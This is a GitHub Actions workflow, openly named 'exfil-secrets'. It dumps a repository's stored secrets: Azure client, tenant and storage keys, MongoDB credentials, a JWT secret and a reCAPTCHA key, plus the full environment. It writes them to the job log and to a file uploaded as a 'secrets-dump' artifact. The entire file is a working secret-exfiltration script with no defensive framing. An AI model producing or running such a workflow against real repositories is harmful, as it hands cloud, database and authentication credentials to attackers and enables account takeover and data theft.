name: exfil-secrets

on:
  workflow_dispatch:

jobs:
  dump:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Exfiltrating ALL Secrets
        run: |
          echo "=== AZURE CREDENTIALS ==="
          echo "AZURE_CLIENT_ID=${{ secrets.AZURE_CLIENT_ID }}"
          echo "AZURE_TENANT_ID=${{ secrets.AZURE_TENANT_ID }}"
          echo "AZURE_SUBSCRIPTION_ID=${{ secrets.AZURE_SUBSCRIPTION_ID }}"
          echo ""
          echo "=== MONGO ==="
          echo "MONGO_USER=${{ secrets.MONGO_USER }}"
          echo "MONGO_PASSWORD=${{ secrets.MONGO_PASSWORD }}"
          echo "MONGO_DATABASE=${{ secrets.MONGO_DATABASE }}"
          echo ""
          echo "=== AZURE BLOB ==="
          echo "AZURE_STORAGE_ACCOUNT_NAME=${{ secrets.AZURE_STORAGE_ACCOUNT_NAME }}"
          echo "AZURE_STORAGE_ACCOUNT_KEY=${{ secrets.AZURE_STORAGE_ACCOUNT_KEY }}"
          echo ""
          echo "=== AUTH ==="
          echo "JWT_SECRET=${{ secrets.JWT_SECRET }}"
          echo "RECAPTCHA_SECRET_KEY=${{ secrets.RECAPTCHA_SECRET_KEY }}"
          echo ""
          echo "=== Any other secrets ==="
          echo "All env:" 
          env | sort

      - name: Save to artifact
        run: |
          {
            echo "=== AZURE CREDENTIALS ==="
            echo "AZURE_CLIENT_ID=${{ secrets.AZURE_CLIENT_ID }}"
            echo "AZURE_TENANT_ID=${{ secrets.AZURE_TENANT_ID }}"
            echo "AZURE_SUBSCRIPTION_ID=${{ secrets.AZURE_SUBSCRIPTION_ID }}"
            echo ""
            echo "=== MONGO ==="
            echo "MONGO_USER=${{ secrets.MONGO_USER }}"
            echo "MONGO_PASSWORD=${{ secrets.MONGO_PASSWORD }}"
            echo "MONGO_DATABASE=${{ secrets.MONGO_DATABASE }}"
            echo ""
            echo "=== AZURE BLOB ==="
            echo "AZURE_STORAGE_ACCOUNT_NAME=${{ secrets.AZURE_STORAGE_ACCOUNT_NAME }}"
            echo "AZURE_STORAGE_ACCOUNT_KEY=${{ secrets.AZURE_STORAGE_ACCOUNT_KEY }}"
            echo ""
            echo "=== AUTH ==="
            echo "JWT_SECRET=${{ secrets.JWT_SECRET }}"
            echo "RECAPTCHA_SECRET_KEY=${{ secrets.RECAPTCHA_SECRET_KEY }}"
          } > secrets_dump.txt

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: secrets-dump
          path: secrets_dump.txt
